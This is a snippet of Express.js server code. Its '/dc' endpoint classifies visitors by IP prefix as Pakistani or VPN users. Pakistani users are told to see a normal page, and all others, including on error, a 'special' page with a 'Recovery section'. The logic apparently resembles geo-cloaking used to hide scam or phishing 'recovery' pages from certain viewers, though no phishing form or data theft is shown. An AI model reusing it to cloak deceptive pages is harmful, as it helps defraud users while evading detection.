// Check if IP is from Pakistan
function isPakistanIP(ip) {
    if (!ip) return false;
    
    for (const pakIP of PAKISTAN_IPS) {
        if (ip.startsWith(pakIP)) {
            return true;
        }
    }
    return false;
}

// Check if IP is VPN
function isVPN(ip) {
    if (!ip) return false;
    
    for (const vpnIP of VPN_IPS) {
        if (ip.startsWith(vpnIP)) {
            return true;
        }
    }
    return false;
}

// Main decision endpoint
app.get('/dc', (req, res) => {
    try {
        // Get client IP
        let clientIP = req.headers['x-forwarded-for'] || 
                      req.headers['x-real-ip'] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress || 
                      req.ip;
        
        // Clean IP address
        if (clientIP.includes(',')) {
            clientIP = clientIP.split(',')[0].trim();
        }
        if (clientIP.startsWith('::ffff:')) {
            clientIP = clientIP.replace('::ffff:', '');
        }
        
        console.log('📡 Client IP:', clientIP);
        
        // Check if IP is from Pakistan OR VPN
        const isPak = isPakistanIP(clientIP);
        const isVPNIP = isVPN(clientIP);
        
        // 🔥 DECISION LOGIC:
        // showPage: true = Normal Page (WITHOUT Recovery section)
        // showPage: false = Special Page (WITH Recovery section)
        
        let showPage = false; // Default: Special Page (WITH Recovery)
        let message = '';
        
        // LOGIC: Pakistan users (even with VPN) get Normal Page
        if (isPak) {
            showPage = true; // Normal Page (WITHOUT Recovery)
            message = isVPNIP ? 
                "Pakistan user with VPN → Normal Page (NO Recovery)" : 
                "Pakistan user → Normal Page (NO Recovery)";
        } else {
            showPage = false; // Special Page (WITH Recovery)
            message = isVPNIP ? 
                "Non-Pakistan user with VPN → Special Page (WITH Recovery)" : 
                "Non-Pakistan user → Special Page (WITH Recovery)";
        }
        
        const response = {
            showPage: showPage,
            ip: clientIP,
            isPakistanIP: isPak,
            isVPN: isVPNIP,
            timestamp: new Date().toISOString(),
            message: message
        };
        
        console.log('📊 Response:', response);
        res.json(response);
        
    } catch (error) {
        console.error('❌ Error in /dc endpoint:', error);
        res.status(500).json({
            showPage: false, // Default to Special Page on error
            error: 'Server error',
            timestamp: new Date().toISOString()
        });
    }
});

